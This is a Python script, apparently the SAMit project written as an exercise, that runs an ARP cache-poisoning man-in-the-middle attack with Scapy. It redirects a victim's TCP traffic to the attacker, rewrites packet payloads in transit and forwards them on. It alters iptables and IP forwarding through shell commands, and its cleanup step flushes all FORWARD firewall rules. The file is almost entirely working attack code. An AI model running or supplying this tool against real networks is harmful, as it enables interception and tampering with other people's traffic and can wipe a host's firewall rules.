#!/usr/bin/python  
# Simple ARP MitM tool developed as an exercise  
# Author: Otavio Augusto otavioarj$at$gmail.com
# At Public Domain if, and only if, the author remain unchanged or a clear reference is made to him =]
# This code completely depends on Scapy http://www.secdev.org/projects/scapy 
#
# https://github.com/otavioarj/SAMit


from threading import Thread
import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

#Packet changer
def pkgchan(pkt):
	global ltseq
	if not(TCP in pkt): # forcing check as tcp in filter isn't enough, for some reason....  
		return
	pkt[Ether].dst=getmacbyip(pkt[IP].dst)
	raw= pkt[TCP].payload
	f = str(raw)
	#print raw
	if 'MO639' in f: # Will search and change MO639 to Ooops
		f=f.replace('MO639','Ooops') # data change, mission accomplished! 
		pkt[TCP].payload=f
		del pkt[TCP].chksum  # checksum isn't automatic updated
		print "[+] Package Temped!"

	#Sending every captured packets, temped or not
	#pkt.show()
	sendp(pkt,verbose=0)
	ltseq=pkt[TCP].seq

# ARP Cache Poison 
# Mode 1 poison
#      2 unpoison
def arpp(target, victim,mode):
	if mode>1:
		fsrc=getmacbyip(target)
		brk=True
	else:
		fsrc=get_if_hwaddr(iface)
		brk=False
	vmac=getmacbyip(victim)
	poison= Ether(dst=vmac,src=fsrc)/ARP(op="is-at",hwdst=vmac,hwsrc=fsrc,psrc=target, pdst=victim) # Scapy don't update ARP HW addrs automatically 
	#poison.show()
	while 1:
		sendp(poison,verbose=0)
		if brk:
			break
		time.sleep(5) # High delay to have low traffic at tcpdump analysis
		


#### Main =] ####
def main():
	if len(sys.argv) < 3 or os.geteuid() != 0:
		print "[*] Usage:", sys.argv[0] ," victim_ip[cannot be broadcast addr]  target_ip [iface (default eth0)]"
		print "[!] Make sure you're *root*, using *sudo* doesn't work!!\n"
		sys.exit(0)
	else:
		client=sys.argv[1]
		server=sys.argv[2]

	if len(sys.argv) < 4:
		interface = "eth0"
	else:
		interface = sys.argv[3]

# Avoiding the kernel sending packets direct to client.. and enabling ip forward on kernel 
# Only works on Linux! It doesn't work with SUDO, as writing on /proc needs real suid permissions
	cmd="iptables -A FORWARD -p tcp -s %s -d %s -j DROP;echo 1> /proc/sys/net/ipv4/ip_forward"%(client,server)
	os.system(cmd)
	global ltseq
	ltseq=0
	global iface
	iface=interface
# Arp poison =]
	th=Thread(target=arpp,args=(server,client,1))
	try:
		th.daemon=True
		print "[*] ARP Poison started"
		th.start()
# Filtering tcp packages, with source on client and destination on server, and rejecting the ones which were already injected.
		sniff(filter='(tcp and (not ether dst %s) and (tcp[4:4]!=%s) and(dst %s and src %s))'%(getmacbyip(server),ltseq,server,client),prn=pkgchan,store=0)
	except Exception, e:
		print "[!] ERROR: %s" % e
	finally:
		print "[*] Repoisoning victims"
		arpp(server,client,2)
		print "[*] Cleaning your iptables FORWARD rules!!"
		os.system("iptables -F FORWARD")
		sys.exit(0)

main()

